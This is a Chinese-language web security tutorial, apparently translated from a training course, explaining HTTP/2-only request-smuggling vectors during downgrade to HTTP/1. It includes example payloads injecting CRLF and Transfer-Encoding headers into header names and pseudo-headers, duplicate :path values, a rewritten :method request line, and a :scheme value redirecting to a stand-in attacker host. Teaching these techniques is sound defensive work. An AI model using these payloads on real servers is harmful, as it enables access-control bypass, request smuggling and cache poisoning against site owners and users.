# HTTP/2 独有攻击向量

由于 HTTP/2 是基于二进制的协议而非基于文本的，因此存在许多在 HTTP/1 中由于语法限制而无法构造的潜在向量。

我们已经了解了如何[将 CRLF 序列注入头部值]。在本节中，我们将介绍一些其他可用于注入载荷的 HTTP/2 独有向量。尽管这类请求被 HTTP/2 规范正式禁止，但某些服务器未能有效地验证和阻止它们。

## 通过头部名称注入

在 HTTP/1 中，头部名称不能包含冒号，因为该字符用于向解析器指示名称的结束。在 HTTP/2 中则并非如此。

通过将冒号与 `\r\n` 字符结合，您可能能够利用 HTTP/2 头部的名称字段将其他头部绕过前端过滤器。一旦请求使用 HTTP/1 语法重写，这些将在后端被解释为独立的头部：

**前端（HTTP/2）头部：**

- `foo: bar\r\nTransfer-Encoding: chunked\r\nX:`: `ignore`

**后端（HTTP/1）收到的内容：**

```http
Foo: bar\r\n
Transfer-Encoding: chunked\r\n
X: ignore\r\n
```

## 通过伪头部注入

HTTP/2 不使用请求行或状态行。相反，这些数据通过请求开头的一系列“伪头部”传递。在以文本形式表示的 HTTP/2 消息中，这些伪头部通常以冒号作为前缀，以帮助与普通头部区分。共有五个伪头部：

- `:method` —— 请求方法。
- `:path` —— 请求路径。请注意，这包括查询字符串。
- `:authority` —— 大致相当于 HTTP/1 的 `Host` 头。
- `:scheme` —— 请求协议，通常为 `http` 或 `https`。
- `:status` —— 响应状态码（不在请求中使用）。

当网站将请求降级为 HTTP/1 时，它们会使用其中一些伪头部的值来动态构造请求行。这带来了一些有趣的新的攻击构造方式。

### 提供歧义主机

尽管在 HTTP/2 中，HTTP/1 的 `Host` 头实际上被 `:authority` 伪头部所取代，但您仍然可以在请求中同时发送 `host` 头。

在某些情况下，这可能导致重写后的 HTTP/1 请求中出现两个 `Host` 头，这为绕过前端的“重复 `Host` 头”过滤器等情况提供了另一种可能性。这可能使网站容易受到一系列其本应免疫的 [`Host` 头攻击]。

### 提供歧义路径

由于请求行的解析方式，在 HTTP/1 中无法发送带有歧义路径的请求。但由于 HTTP/2 中的路径是使用伪头部指定的，现在可以如下发送带有两个不同路径的请求：

**前端（HTTP/2）头部：**

- `:method`: `POST`
- `:path`: `/anything`
- `:path`: `/admin`
- `:authority`: `vulnerable-website.com`

如果网站访问控制所验证的路径与用于路由请求的路径之间存在差异，这可能使您能够访问原本被禁止的端点。

### 注入完整请求行

在降级期间，`:method` 伪头部的值将被写入生成的 HTTP/1 请求的最开头。如果服务器允许您在 `:method` 值中包含空格，您可以如下注入一个完全不同的请求行：

**前端（HTTP/2）头部：**

- `:method`: `GET /admin HTTP/1.1`
- `:path`: `/anything`
- `:authority`: `vulnerable-website.com`

**后端（HTTP/1）收到的内容：**

```http
GET /admin HTTP/1.1 /anything HTTP/1.1
Host: vulnerable-website.com
```

只要服务器也容忍请求行中任意的尾随字符，这就提供了另一种创建具有歧义路径的请求的方法。

### 注入 URL 前缀

HTTP/2 的另一个有趣特性是能够使用 `:scheme` 伪头部在请求本身中显式指定协议。虽然这通常只包含 `http` 或 `https`，但您可能能够包含任意值。

当服务器使用 `:scheme` 头动态生成 URL 时，这可能很有用。在这种情况下，您可以为 URL 添加前缀，甚至通过将真实 URL 推入查询字符串来完全覆盖它：

**请求头部：**

- `:method`: `GET`
- `:path`: `/anything`
- `:authority`: `vulnerable-website.com`
- `:scheme`: `https://evil-user.net/poison?`

**响应头部：**

- `:status`: `301`
- `location`: `https://evil-user.net/poison?://vulnerable-website.com/anything/`

### 向伪头部注入换行符

当向 `:path` 或 `:method` 伪头部注入时，您需要确保生成的 HTTP/1 请求仍然具有有效的请求行。

由于 `\r\n` 在 HTTP/1 中终止请求行，简单地在中途添加 `\r\n` 只会破坏请求。降级后，重写后的请求必须在您注入的第一个 `\r\n` 之前包含以下序列：

```
<method> + space + <path> + space + HTTP/1.1
```

只需可视化您的注入落在此序列中的位置，并相应地包含所有剩余部分。例如，当注入 `:path` 时，您需要按如下方式在 `\r\n` 之前添加一个空格和 `HTTP/1.1`：

**前端（HTTP/2）头部：**

- `:method`: `GET`
- `:path`: 
  ```
  /example HTTP/1.1\r\n
  Transfer-Encoding: chunked\r\n
  X: x
  ```
- `:authority`: `vulnerable-website.com`

**后端（HTTP/1）收到的内容：**

```http
GET /example HTTP/1.1\r\n
Transfer-Encoding: chunked\r\n
X: x HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```

请注意，在这种情况下，我们还添加了一个任意的尾随头部，以捕获重写过程中自动添加的空格和协议。
